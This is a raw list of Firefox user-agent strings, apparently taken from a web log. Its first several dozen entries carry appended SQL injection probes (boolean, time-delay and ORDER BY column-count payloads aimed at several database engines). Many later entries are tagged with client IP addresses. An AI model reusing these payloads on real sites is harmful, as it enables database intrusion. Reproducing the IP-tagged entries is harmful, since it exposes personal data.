Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(79)||CHAR(117)||CHAR(72)||CHAR(80) WHERE 8903=8903 OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 2427=2427 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 9175=9175 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS wEMA WHERE 5689=5689 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS WVEL WHERE 2906=2906 AND CHAR(65)||CHAR(68)||CHAR(70)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 8937=8937 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT CHAR(121)||CHAR(76)||CHAR(73)||CHAR(108) WHERE 9713=9713 OR CHAR(73)||CHAR(122)||CHAR(104)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (((\x22mEbp\x22 LIKE \x22mEbp
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT UATk FROM DUAL WHERE 5958=5958 AND 1116=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- kQYz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND (((8620=8620
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)# iEbh
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 9052=9052 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- UVEk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 6381=6381 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- JfXz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT jEOX FROM DUAL WHERE 8838=8838 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 4020=4020 OR 6430=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- vjKL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 2690=2690 AND 3587=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 1064=1064 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND ((\x22CGwT\x22=\x22CGwT
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND (((\x22VWSj\x22 LIKE \x22VWSj
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 1867=1867 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 9967=9967 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND 'caTs%'='caTs
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT CHAR(65)||CHAR(82)||CHAR(122)||CHAR(68) WHERE 2741=2741 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND ((5289=5289
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- mflJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 2572=2572 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- VYCv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(90)||CHAR(74)||CHAR(66)||CHAR(85) FROM DUAL WHERE 8103=8103 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (7821=7821) THEN SLEEP(32) ELSE 7821 END))-- bbSb
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (8168=8168) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)-- xvLD
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) ORDER BY 1-- NUyt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 1-- XTjQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 1-- FGOE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 1-- sCes
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 6080-- CWUJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 5875-- RJAb
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS LNpp WHERE 8546=8546 ORDER BY 9683-- Aqhz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 4112=4112 ORDER BY 1-- EsLy
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 2911=2911 ORDER BY 2392-- pQns
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 3944#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) ORDER BY 3592#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) ORDER BY 7054#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) ORDER BY 1#
Mozilla/5.0 (Windows NT 5.1; rv:99.0) Gecko/20100101 Firefox/99.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:85.1) Gecko/20100101 Firefox/85.1
Mozilla/5.0 (X11; NetBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 anonymized by Abelssoft 924636479
Mozilla/5.0 (Windows NT 6.1; rv:82.0.2 WIA enabled) Gecko/20100101 Firefox/82.0.2
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 anonymized by Abelssoft 2050165297
Mozilla/5.0 (Android 9.1; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0 DT-Browser/DTB7.42.0.19_01
Mozilla/5.0 (Android 6.1; Mobile; rv:67.0) Gecko/67.0 Firefox/67.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/9E23
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.13
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101  D2mgqVeU-16 Firefox/56.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0/q1900mp
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.45.202.49]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:80.182.242.110]
Mozilla/5.0 (Android 8.1.0; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:95.249.157.51]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.50.245.9]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 [ip:212.171.19.137]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:185.249.15.3]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.170.86.5]
Mozilla/5.0 (Android 7.0; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:213.32.4.81]
Mozilla/5.0 (Android 7.0; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:213.32.4.211]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.50.49.93]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.45.54.105]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:78.12.76.181]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.65.97.35]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.0.49.99]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:83.225.112.167]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.61.207.10]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.102.4.103]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.147.24.239]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:80.21.108.194]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.42.11.76]
Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0 [ip:47.60.38.44]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.236.202.95]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.251.51.141]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:92.223.231.203]
Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:146.247.137.80]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.252.77.54]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.18.212.145]
Mozilla/5.0 (Windows NT 6.3; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.66.218.109]
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:91.80.7.74]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.182.128.175]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.239.190.129]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.59.177.118]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.13.217.44]
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:62.11.172.32]
Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.239.229.239]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.92.105.209]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.36.101.243]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:91.140.24.191]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.52.12.185]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:176.201.169.149]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.3.157.232]
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.52.47.154]
Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.163.71.151]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:2.41.18.149]
Mozilla/5.0 (Android 4.1.1; Tablet; rv:50.0) Gecko/50.0 Firefox/50.0
Mozilla/5.0 (Windows NT 6.2; rv:83.0) Gecko/20100101 Firefox/83.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0; WUID=3cbb6087e2def0e32c1aa4b4feabb24c; WTB=21824) Gecko/20100101 Firefox/47.0
Mozilla/5.0 (Windows NT 10.0; rv:84.0) Gecko/20100101 Firefox/84.0
Mozilla/5.0 (Windows; U; Windows NT 5.0; fr; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 anonymized by Abelssoft 1875344785
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0/8mqQaZuL-16
Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.1.3) Gecko/20070505 Firefox/52.0
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 anonymized by Abelssoft 312848745
Mozilla/5.0 (Windows NT 6.3; rv:76.0) Gecko/20100101 Firefox/76.0 anonymized by Abelssoft 742725038
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.3) Gecko/20060426 Firefox/50.0.1
Mozilla/5.0 (X11; U; Linux x86_64; ko-KR; rv:1.9.0.1) Gecko/2008071717 Firefox/50.0.2
Mozilla/5.0 (X11; SunOS sun4u; rv:78.0) Gecko/20100101 Firefox/78.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:45.0) Gecko/20100101 Firefox/45.0
Mozilla/5.0 (X11; Linux mips64; rv:82.0) Gecko/20100101 Firefox/82.0
Mozilla/5.0 (Windows NT 10.0; rv:52.9) Gecko/20100101 Gecko/3.4 Firefox/52.9 K-Meleon/76.3.1
Mozilla/5.0 (Windows NT 10.0; rv:68.9) Gecko/20100101 Goanna/4.7 Firefox/68.9 Mypal/28.15.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.44.106.183]
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 [ip:93.51.232.116]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.72.193.25]
Mozilla/5.0 (Android 5.0.1; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0 [ip:95.234.91.171]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:79.41.63.212]
Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0 [ip:151.50.56.115]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:213.32.4.211]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.26.75.56]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:213.32.4.102]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.35.221.99]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.245.63.69]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.40.112.39]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:2.32.247.28]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 [ip:2.34.163.101]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.23.225.28]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:89.96.63.85]
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.42.67.127]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:31.13.115.119]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:31.13.115.116]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0 [ip:18.236.41.28]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:78.12.71.251]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.64.148.198]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:146.241.63.237]
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 [ip:93.44.108.119]
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0 [ip:93.41.34.32]
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.62.202.207]
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:159.213.44.2]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:78.159.145.224]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.48.250.176]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:2.228.159.110]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.10.181.114]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.245.121.86]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.36.220.246]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.150.90.173]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 [ip:82.185.50.75]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 [ip:81.208.31.203]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:80.17.17.66]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.237.180.98]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.246.228.120]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:89.39.224.10]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.42.70.47]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.37.140.185]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:78.152.96.155]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:46.44.218.219]
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.77.138.95]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:217.61.41.196]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.163.155.211]
Mozilla/5.0 (Android 8.1.0; Mobile; rv:80.0) Gecko/80.0 Firefox/80.0 [ip:5.90.6.6]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:80.181.57.158]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.63.115.100]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.147.227.96]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:178.148.232.13]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.168.251.32]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 [ip:191.96.97.58]
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:213.32.4.81]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.34.91.62]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:92.245.172.251]
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:128.176.254.11]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0 [ip:188.152.146.46]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.42.127.42]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.34.83.138]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.42.67.113]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:94.38.80.138]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:213.32.4.102]
